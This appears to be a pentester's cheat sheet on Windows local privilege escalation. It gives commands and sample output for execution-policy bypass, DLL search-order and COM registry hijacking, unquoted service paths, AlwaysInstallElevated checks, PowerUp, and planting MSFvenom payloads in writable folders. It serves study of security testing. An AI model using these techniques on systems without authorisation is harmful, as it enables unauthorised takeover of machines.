## side note:
Execution Policy Bypass
```
powershell -ep bypass
```

# Search exploit-db for Vulnerabilities in Kali:
```
searchsploit MS16 windows local
```

## Check task manager for apps running as SYSTEM to see if you can open them to see if you can get an elevated terminal

# DLL 
## Search Order:
### Unsafe:
1. Current Directory
2. Directory from which the app was loaded
3. System Directory (C:\Windows\System32)
4. the 16-bit system directory (C:\Windows\System)
5, Windows Directory (C:\Windows)
6. Directories listed in the PATH variables

### Safe(r):
1. Directory from which the app was loaded
2. System Directory (C:\Windows\System32)
3. the 16-bit system directory (C:\Windows\System)
4, Windows Directory (C:\Windows)
5. Current Directory
6. Directories listed in the PATH variables


## ProcMon:
1. learn to build proxy DDLs
2. download from microsfot.com
3. search for missinf DLLs
4. look for results that are:
5. NAME NOT FOUND


# Directory with interesting permissions:
### wmic service get pathname |findstr /i system
```
C:\>wmic service get pathname |findstr /i system

C:\WINDOWS\system32\svchost.exe -k LocalServiceNetworkRestricted -p
C:\WINDOWS\System32\alg.exe     
C:\WINDOWS\system32\svchost.exe -k LocalServiceNetworkRestricted -p  
C:\WINDOWS\system32\svchost.exe -k netsvcs -p                         
C:\WINDOWS\system32\svchost.exe -k netsvcs -p                        
C:\WINDOWS\System32\svchost.exe -k AppReadiness -p                  
C:\WINDOWS\system32\AppVClient.exe                           
```

## Next Check Folder Permissions:
### icacls "C:\WINDOWS\system32\AppVClient.exe"

```
C:\>icacls "C:\WINDOWS\system32\AppVClient.exe"

C:\WINDOWS\system32\AppVClient.exe NT SERVICE\TrustedInstaller:(F)
                                   BUILTIN\Administrators:(RX)
                                   NT AUTHORITY\SYSTEM:(RX)
                                   BUILTIN\Users:(RX)
                                   APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(RX)
                                   APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(RX)

Successfully processed 1 files; Failed processing 0 files
```

#### looking for (WD) or (AD):
- Delete: removes files or DLLs
- Write Data/ Add File: add a DLL that is sideloaded into an application with elevated privileges
- Write Attributes: set file attributes to hidden or system, poenially hiding them from view by most users
- Append Data: allows the user to add data to the end of a file, but not overwrite any existing data
- Change Permissions: this is pretty much full control 


if any portion of the SYSTEM %PATH% variable is writeable by Authenticated Users, there are opportunities for privilege escalation. 

check the PATH Variable:
```
reg query "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\Environment"
```


## Subinacl tool (windows resource kit)
registry keys have permissions, obtain ACL info on registry keys:
```
subinacl /keyreg HKEY_LOCAL_MACHINE\software\microsoft
```
now in Powershell
obtain ACL info on registry keys:
```
Get-Acl HKLM:\software |format-list
```


# Unquoted Path Vulnerability:
Make an exe and get it to run. If a program is not using quotes in its path, Windows will assume every space is the end and add ".exe" too see if it exists and run it
```
Example: C:\program file (x86)\custom app\my custom app.exe
Will check all these possibilities:

C:\program.exe
C:\program file.exe
C:\program file (x86)\custom.exe
C:\program file (x86)\custom app\my.exe
C:\program file (x86)\custom app\my custom.exe
```

# NETSH	
Netsh is called all the time and is safer to use on a pentest.

Usage: netsh [-a AliasFile] {-c Context] [-r RemoteMachine] [-u [DomainName\]UserName] [-p Password | *} {Command | -f ScriptFile]
```
netsh -c trace ????
```

# Look for the InstallAlwaysElevated:
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
```
If these are configured you can use MSFVenom to build an MSI to elevate permissions. 


# Look for partially uninstalled programs that left 
Taken from: 

https://bohops.com/2018/06/28/abusing-com-registry-structure-clsid-localserver32-inprocserver32/

https://bohops.com/2018/06/28/abusing-com-registry-structure-clsid-localserver32-inprocserver32/
# COM registry files you can abuse, check out:
https://bohops.com/2018/06/28/abusing-com-registry-structure-clsid-localserver32-inprocserver32

## LocalServer32:
Example location:
```
Computer\HKEY_CLASSES_ROOT\CLSID\{B43A0C1E-B63F-4691-B68F-CD807A45DA01}\LocalServer32
Computer\HKEY_CLASSES_ROOT\CLSID\{046AEAD9-5A27-4D3C-8A67-F82552E0A91B}
```

### In Powershell:
```
$inproc = gwmi Win32_COMSetting | ?{ $_.LocalServer32 -ne $null }
$inproc | ForEach {$_.LocalServer32} > values.txt
$paths = gc .\values.txt
foreach ($p in $paths){$p;cmd /c dir $p > $null}
```

### Output:
```
%SystemRoot%\System32\rundll32.exe shell32.dll,SHCreateLocalServerRunDll {046AEAD9-5A27-4D3C-8A67-F82552E0A91B}
File Not Found				<== this is what we are looking for!!!
%SystemRoot%\System32\fsquirt.exe
```

In regedit.exe
```
Computer\HKEY_CLASSES_ROOT\CLSID\{046AEAD9-5A27-4D3C-8A67-F82552E0A91B}
Computer\HKEY_CLASSES_ROOT\CLSID\{046AEAD9-5A27-4D3C-8A67-F82552E0A91B}\LocalServer32
```

verify that the file is actually missing. and that you have ACL rights for the folder. 

dir "<folder-path>"
get-acl "<folder-path>" | fl

```
dir "C:\Program Files (x86)\VMware\VMware Workstation\"
get-acl "C:\Program Files (x86)\VMware\VMware Workstation\" | fl
```
Look at the Access level. Want to find "Everyone Allow FullControl" or "<current-user> Allow FullControl" or WRITE Access. 

```
PS C:\> get-acl "C:\Program Files\LibreOffice\program\" | fl                                                            
Path   : Microsoft.PowerShell.Core\FileSystem::C:\Program Files\LibreOffice\program\
Owner  : NT AUTHORITY\SYSTEM
Group  : NT AUTHORITY\SYSTEM
Access : NT SERVICE\TrustedInstaller Allow  FullControl
         NT SERVICE\TrustedInstaller Allow  268435456
         NT AUTHORITY\SYSTEM Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  268435456
         BUILTIN\Administrators Allow  FullControl
         BUILTIN\Administrators Allow  268435456
         BUILTIN\Users Allow  ReadAndExecute, Synchronize
         BUILTIN\Users Allow  -1610612736
         CREATOR OWNER Allow  268435456
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  -1610612736
         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  -1610612736
Audit  :
Sddl   : O:SYG:SYD:AI(A;ID;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;CIIOID;GA;;;S-1-5-80-
         956008885-3418522649-1831038044-1853292631-2271478464)(A;ID;FA;;;SY)(A;OICIIOID;GA;;;SY)(A;ID;FA;;;BA)(A;OICII
         OID;GA;;;BA)(A;ID;0x1200a9;;;BU)(A;OICIIOID;GXGR;;;BU)(A;OICIIOID;GA;;;CO)(A;ID;0x1200a9;;;AC)(A;OICIIOID;GXGR
         ;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)(A;OICIIOID;GXGR;;;S-1-15-2-2)
```

If you can make changes to the folder, then use MSFvenom to create an EXE named the same as the missing file and put it where the dll expects to find it. 


##Can also check:
##InprocServer32:
Computer\HKEY_CLASSES_ROOT\CLSID\{B3EE7802-8224-4787-A1EA-F0DE16DEABD3}\InprocServer32

### In Powershell:
```
$inproc = gwmi Win32_COMSetting | ?{ $_.InprocServer32 -ne $null }
$paths = $inproc | ForEach {$_.InprocServer32}
foreach ($p in $paths){$p;cmd /c dir $p > $null} 
```
consider redirecting this output to file for easier analysis.

### Output:
```
C:\Windows\System32\oleaut32.dll
combase.dll
File Not Found				<== this is what we are looking for!!!
%SystemRoot%\system32\windowscodecs.dll
combase.dll
File Not Found				<== this is what we are looking for!!!
C:\Windows\System32\combase.dll
C:\Program Files (x86)\Microsoft\EdgeUpdate\1.3.135.41\psmachine_64.dll
File Not Found				<== this is what we are looking for!!!
C:\Windows\System32\AppIdPolicyEngineApi.dll
AppxDeploymentClient.dll
File Not Found				<== this is what we are looking for!!!
```


## Powerup by harmj0y- priv esc windows:
#### show our user is not currently admin:
```
net localgroup administrators
```
#### start powershell:
```
powershell.exe -exec bypass
```
#### start powerup:
```
.\PowerUp.ps1
Invoke-AllChecks
Write-UserAddNSI
```
creates an app on the desktop for making a new user. 



# "at" command runs as "SYSTEM"
``` 
at 13:01 /interactive cmd
```
